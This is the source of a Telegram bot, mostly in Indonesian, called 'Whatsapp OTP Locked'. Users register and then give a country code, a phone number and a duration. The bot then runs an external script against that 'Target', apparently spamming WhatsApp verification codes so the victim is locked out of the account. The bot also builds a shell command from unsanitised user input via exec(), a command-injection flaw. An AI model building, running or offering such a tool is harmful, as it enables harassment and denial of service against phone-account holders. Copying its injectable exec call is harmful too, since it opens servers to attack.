const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const settings = require('./settings');
const botToken = settings.token;
const adminfile = 'adminID.json';
const premiumUsersFile = 'premiumUsers.json';
const bot = new TelegramBot(botToken, { polling: true });
const runningProcesses = {};
const { exec } = require('child_process'); // Import modul exec


let adminUsers = [];
try {
    adminUsers = JSON.parse(fs.readFileSync(adminfile));
} catch (error) {
    console.error('Error reading adminUsers file:', error);
}

let premiumUsers = [];
try {
    premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}

function readDatabase() {
    try {
        const data = fs.readFileSync('./database.json', 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error("Gagal membaca database:", err);
        return [];
    }
}

function saveDatabase(data) {
    try {
        fs.writeFileSync('./database.json', JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("Gagal menyimpan database:", err);
    }
}

function addIdToDatabase(id) {
    let database = readDatabase();
    database.push({ id });
    saveDatabase(database);
}

function isIdInDatabase(id) {
    const database = readDatabase();
    return database.some(entry => entry.id === id);
}

function removeIdFromDatabase(id) {
    let database = readDatabase();
    database = database.filter(entry => entry.id !== id);
    saveDatabase(database);
}

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    if (!isIdInDatabase(from)) {
        bot.sendPhoto(chatId, settings.pp, { 
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ You are not yet registered in the database
┣⮕ Silahkan /register (Untuk Mendaftar Yaa!)
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    } else {
        bot.sendPhoto(chatId, settings.pp, { 
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ Penggunaan : /temp (negara) (nomor) (jumlah)
┣⮕ Contoh : /temp 62 8xxxxx 30
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    }
});

bot.onText(/\/register/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    if (!isIdInDatabase(from)) {
        addIdToDatabase(from);
        bot.sendPhoto(chatId, settings.pp, { 
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ SUCCESSFULL REGISTERED✅
┣⮕ Memulai : /start
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    } else {
        bot.sendPhoto(chatId, settings.pp, { 
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ KAMU SUDAH TERDAFTAR✅
┣⮕ Memulai : /start
┣⮕ Developer: @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    }
});


bot.onText(/\/temp/, (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/); // Memisahkan pesan menjadi array kata-kata

    if (runningProcesses[chatId]) {
        bot.sendPhoto(chatId, settings.pp, {
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ there is still an ongoing process
┣⮕ Command : /stop (Untuk Stop Tempor!)
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    } else {
        if (args.length !== 4) {
            bot.sendPhoto(chatId, settings.pp, {
                caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ Penggunaan : /temp (negara) (nomor) (jumlah)
┣⮕ Contoh : /temp 62 8xxxxx 30
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
            });
        } else {
            const input1 = args[1];
            const input2 = args[2];
            const timeHours = parseInt(args[3]); // Mengonversi string waktu menjadi bilangan bulat

            if (isNaN(timeHours)) {
                bot.sendPhoto(chatId, settings.pp, {
                    caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ Penggunaan : /temp (negara) (nomor) (jumlah)
┣⮕ Contoh : /temp 62 8xxxxx 30
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
                });
            } else {
                const command = `node temp.js ${input1} ${input2}`;
                const process = exec(command);

                bot.sendPhoto(chatId, settings.pp, {
                    caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ Target : ${input1} ${input2}
┣⮕ Status : Otp  Has Been Locked
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
                });
                runningProcesses[chatId] = true;

                setTimeout(() => {
                    delete runningProcesses[chatId];
                    bot.sendPhoto(chatId, settings.pp, {
                        caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ Target : ${input1} ${input2}
┣⮕ Status : Done Silahkan Cek!
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
                    });
                }, timeHours * 60 * 60 * 1000);
            }
        }
    }
});
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    const usr = msg.from.username;

    if (runningProcesses[chatId]) {
        delete runningProcesses[chatId];
        bot.sendPhoto(chatId, settings.pp, {
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ Process Has Been Terminated
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    } else {
        bot.sendPhoto(chatId, settings.pp, {
            caption: `🔒 Whatsapp OTP Locked 🔒
            
┏━⏍ HAI KAK👋 @${usr}
┣⮕ There Are No Processes Running!
┣⮕ Developer : @arifstarboy
┗━━──━━━━─┉━━❐`
        });
    }
});